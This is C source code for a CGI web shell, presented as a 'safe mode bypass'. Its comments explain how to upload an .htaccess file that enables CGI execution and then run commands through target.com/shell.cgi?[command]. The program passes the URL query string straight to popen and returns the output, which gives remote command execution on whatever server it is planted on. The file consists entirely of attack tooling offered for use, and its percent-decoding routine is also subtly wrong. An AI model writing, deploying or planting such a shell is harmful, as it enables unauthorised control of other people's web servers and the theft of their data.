#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>


//CGI-C Shell - Safe mode bypass ~ r0ng ~ hackers2devnull.blogspot.co.uk
//Upload a .htaccess file with:
//  Options +ExecCGI
//  AddHandler cgi-script cgi
//Then usage is target.com/shell.cgi?[command]
//Compatible with Windows and linux 

int main( void )

{

    char *env = getenv("QUERY_STRING");


    char pStream[128];


    FILE  *pPipe;


    urlStrip(env);

    printf("Content-type: text/html\n\n\n");



    #if defined (WIN32) || defined (_WIN32) || defined (__WIN32__) || defined (__NT__) || defined (WIN64) || defined (_WIN64) || defined (__WIN64__)


    pPipe = _popen( env, "r" );


    #else


    pPipe = popen( env, "r" );


    #endif



    while( !feof( pPipe ) )


    {
      
        if( fgets( pStream, 128, pPipe ) != NULL )

        printf( "<pre>%s", pStream );
     
    }


}int urlStrip(char *str)

{

    unsigned int i;

    char url[BUFSIZ];

    char *ptr = url;

    memset(url, 0, sizeof(url));



    for (i=0; i < strlen(str); i++)

    {

        if (str[i] != '%')

        {

            *ptr++ = str[i];

            continue;

        }



        if (!isdigit(str[i+1]) || !isdigit(str[i+2]))

        {

            *ptr++ = str[i];

            continue;

        }



        *ptr++ = ((str[i+1] - '0') << 4) | (str[i+2] - '0');

        i += 2;

    }

    *ptr = '\0';

    strcpy(str, url);

    return 0;} 
